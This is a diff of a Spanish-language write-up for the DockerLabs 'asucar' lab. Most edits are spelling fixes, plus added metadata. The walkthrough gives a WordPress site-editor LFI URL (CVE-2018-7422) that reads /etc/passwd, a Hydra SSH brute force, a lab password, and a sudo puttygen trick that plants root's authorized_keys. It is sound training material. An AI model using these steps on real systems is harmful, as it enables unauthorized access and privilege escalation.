@@ -2,14 +2,37 @@
 Estado: Completado
 Plataforma: DockerLabs
 SO: Linux
-Dificultad: Medio
+Dificultad: Media
 VectorInicial: LFI en plugin vulnerable de WordPress (site-editor <= 1.1.1)
+ServicioInicial: HTTP
+PuertoInicial: 80
+Credenciales:
+ - curiosito: password1
+ - root mediante authorized_keys
+Usuarios:
+ - curiosito
+ - root
 Privesc: Abuso de sudo NOPASSWD con puttygen para escribir authorized_keys de root
+Tecnicas:
+ - Service Enumeration
+ - WordPress Enumeration
+ - Local File Inclusion
+ - User Enumeration
+ - Password Brute Force
+ - SSH Access
+ - Sudo Privilege Escalation
+ - Authorized Keys Abuse
+Herramientas:
+ - gomap
+ - wpscan
+ - hydra
+ - ssh
+ - puttygen
 Fecha: 2026-02-12
 ---
 <img width="913" height="530" alt="Pasted image 20260211154801" src="https://github.com/user-attachments/assets/3af77b1c-72e2-42e3-845d-dae5b840d97d" />
 
-Lo primero que realizaremos sera un escaneo para identificar puertos y servicios abiertos:
+Lo primero que realizaremos será un escaneo para identificar puertos y servicios abiertos:
 
 ```bash
  settarget 172.17.0.2
@@ -24,18 +47,18 @@ TARGET establecido: 172.17.0.2
 ```
 
 Vemos que tenemos 2 puertos abiertos:
-* Puerto 22 para conexiones por SHH
+* Puerto 22 para conexiones por SSH
 * Puerto 80 de servicio web
 
 Empecemos por la web a ver que tenemos.
 
 <img width="1797" height="826" alt="Pasted image 20260211161159" src="https://github.com/user-attachments/assets/9d649832-8f02-4d82-8aa3-2d7df3d445b6" />
 
-Nos encontramos con la pagina mal maquetada y sin imágenes, por consiguiente pasaremos el ratón por encima de algún enlace para ver si hay dominio al que apunten o usando CTR+U para ver el código de la web y comprobarlo.
+Nos encontramos con la página mal maquetada y sin imágenes. Por consiguiente, pasaremos el ratón por encima de algún enlace para ver si hay algún dominio al que apunten o usaremos `CTRL+U` para ver el código fuente y comprobarlo.
 
 <img width="1260" height="608" alt="Pasted image 20260211161716" src="https://github.com/user-attachments/assets/33bc3963-84ec-43d4-905e-886bac2d0191" />
 
-Efectivamente necesitamos indicar en nuestro **/etc/hosts** el dominio de esta web
+Efectivamente, necesitamos indicar en nuestro **/etc/hosts** el dominio de esta web.
 
 ```bash
  sudo nano /etc/hosts
@@ -68,7 +91,7 @@ Ahora usaremos una herramienta para el reconocimiento de usuarios y plugins para
  wpscan --url http://asucar.dl -e u,p
 ```
 
-Con el **-e** indicamos que queremos realizar un enumeración de *usuarios* y *plugins* obteniendo el siguiente resultado:
+Con `-e` indicamos que queremos realizar una enumeración de *usuarios* y *plugins*, obteniendo el siguiente resultado:
 
 ```bash
 [+] WordPress version 6.5.3 identified (Insecure, released on 2024-05-07).
@@ -172,7 +195,7 @@ Con el **-e** indicamos que queremos realizar un enumeración de *usuarios* y *p
 
 El usuario que identificamos en la entrada es el único que encontramos en la enumeración, pero en los plugins vemos que tenemos **site-editor** que es vulnerable a un **LFI**.
 
-Buscando en Internet este plugin y su versión damos con el CVE-2018-7422 el cual nos servira para ver los usuarios del */etc/passwd*, solo tenemos que poner en la url lo siguinete:
+Buscando en Internet este plugin y su versión damos con el CVE-2018-7422, que nos servirá para ver los usuarios del `/etc/passwd`. Solo tenemos que poner en la URL lo siguiente:
 
 ```html
 http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
@@ -208,7 +231,7 @@ De esta manera podremos ver todos los usuarios del sistema.
 |{"success":true,"data":{"output":[]}}|
 ```
 
-En este listado encontramos un usuario llamado ***curiosito*** el cual podremos usar desde **ssh** para intentar el acceso mediante *hydra*.
+En este listado encontramos un usuario llamado **curiosito**, el cual podremos usar sobre **SSH** para intentar el acceso mediante *Hydra*.
 
 ```bash
  hydra -l curiosito -P /usr/share/wordlists/rockyou.txt 172.17.0.2 -t 5 ssh
@@ -222,7 +245,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-11 17:05:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-11 17:05:22
 ```
 
-Ya hemos obtenido un usuario para una conexión por **ssh** ahora nos conectaremos y empezaremos la escalada de privilegios.
+Ya hemos obtenido un usuario para una conexión por **SSH**. Ahora nos conectaremos y empezaremos la escalada de privilegios.
 
 ```bash
  ssh curiosito@$TARGET      
@@ -252,7 +275,7 @@ User curiosito may run the following commands on 988e23ca99ad:
     (root) NOPASSWD: /usr/bin/puttygen
 ```
 
-Vemos que hay un binario que podemos usar para intentar una escalada, pero antes comprobaremos la web de https://gtfobins.org/ pero no encontramos resultados así que tendremos que buscar otra forma.
+Vemos que hay un binario que podemos usar para intentar una escalada, pero antes comprobaremos la web de <https://gtfobins.org/>. Como no encontramos resultados, tendremos que buscar otra forma.
 
 ```bash
 curiosito@988e23ca99ad:~$ find / -perm 4000 2>/dev/null
@@ -262,13 +285,13 @@ Intentamos la búsqueda de binarios con *suid* sin resultados.
 
 Pero viendo que podemos ejecutar ***puttygen*** como **root** podremos creamos unas credenciales para conectarnos por *ssh* y así tener acceso al **root**.
 
-Primero generamos una clave privada
+Primero generamos una clave privada.
 
 ```bash
 curiosito@988e23ca99ad:~$ ssh-keygen -t rsa -b 4096 -f /tmp/asucar -N ""
 ```
 
-Ahora convertiremos la clave privada con **puttygen** para añadirla al *root*
+Ahora convertiremos la clave privada con **puttygen** para añadirla al usuario `root`.
 
 ```bash
 sudo puttygen /tmp/asucar \
@@ -301,7 +324,7 @@ root@78285efe6287:~# pwd
 root@78285efe6287:~#
 ```
 
-Con esto ya tendríamos  comprometida la maquina.
+Con esto ya tendríamos comprometida la máquina.
 
 ## Conclusión
 
@@ -318,5 +341,5 @@ Posteriormente, una **configuración insegura de sudo**, permitiendo ejecutar bi
 - Cómo el abuso de **authorized_keys** sigue siendo una técnica muy efectiva en entornos mal configurados.
 
 ---
-Si te gusto puedes invitarme a un cafe.
+Si te gustó, puedes invitarme a un café.
 [![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/C0C61UHTB1)
